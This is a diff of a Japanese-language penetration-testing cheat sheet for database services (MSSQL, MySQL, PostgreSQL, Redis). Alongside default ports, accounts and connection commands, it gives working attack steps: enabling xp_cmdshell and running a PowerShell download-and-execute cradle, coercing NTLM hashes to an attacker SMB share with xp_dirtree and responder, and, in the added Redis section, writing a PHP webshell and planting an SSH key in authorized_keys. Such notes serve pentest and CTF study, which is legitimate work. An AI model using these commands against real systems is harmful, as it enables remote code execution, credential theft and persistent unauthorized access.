@@ -1,7 +1,7 @@
 # Microsoft SQL Server
 ## Default account
 sa
-## Default Port
+## Default port
 1433
 ## Connection
 `-windows-auth`が不要な場合あり。  
@@ -15,7 +15,7 @@ impacket-mssqlclient -hashes :<NTLM HASH> <User>@<Target>
 ```
 ## sysadmin
 サーバーに対するすべての操作を実行できる権限。
-### sysadminによるRCE
+### RCE
 `SELECT IS_SRVROLEMEMBER('sysadmin')`の結果が1であればsysadmin
 ```
 EXEC sp_configure 'show advanced options', 1;
@@ -26,7 +26,7 @@ EXEC xp_cmdshell "powershell -c iex(new-object net.webclient).downloadstring('ht
 ```
 ## xp_dirtree, xp_fileexist
 Windowsファイルシステムにアクセスできるストアドプロシージャ。
-### xp_dirtree, xp_fileexistによるNTLMハッシュ奪取
+### NTLMハッシュ奪取
 攻撃端末でSMBサーバーを起動する。  
 `sudo responder -I tun0`
 ```
@@ -38,11 +38,11 @@ EXEC xp_fileexist '\\<YOUR IP>\<Share>'
 root
 ## Default password
 
-## Default Port
+## Default port
 3306, 33060
 ## Connection
 `-p`はパスワードとの間にスペース不要。入力しない場合は要求される。  
-`-e`を使うとローカルのMySQLに接続すると同時にクエリを実行する。  
+`-e`を使うとローカルで接続すると同時にクエリを実行する。  
 `-ssl=0`を使うとTLS/SSL接続をしないまま接続する。
 ```
 mysql -h <Target> -P <Port> -u <User> -p<Password>
@@ -54,10 +54,39 @@ mysql -u <User> -p<Password> -e '<Query>;'
 postgres
 ## Default database
 postgres
-## Default Port
+## Default port
 5432
 ## Connection
 ```
 psql -h <Target> -U <User> -p <Port>
 ```
 # Redis
+NoSQL
+## Default port
+6379
+## Connection
+`-p`は省略するとデフォルトポートに接続する。  
+`-x`は接続すると同時にコマンドを実行する。
+```
+redis-cli -h <Target> -p <Port>
+redis-cli -h <Target> -x <Command>
+```
+## config
+設定値を編集することができるコマンド。
+### webshellのアップロード
+```
+config set dir /var/www/html
+config set dbfilename <Filename>
+set payload <?php system($_GET['cmd']);?>
+save
+```
+`http://target.com/webshell.php?cmd=whoami`
+### ssh公開鍵の登録
+```
+config set dir <Path>/.ssh
+(sudo echo -e '\n'; cat <Public key>; echo -e '\n') > pub_key.txt
+cat pub_key.txt | redis-cli -h <Target> -x set ssh_key
+redis-cli -h <Target>
+config set dbfilename authorized_keys
+save
+```
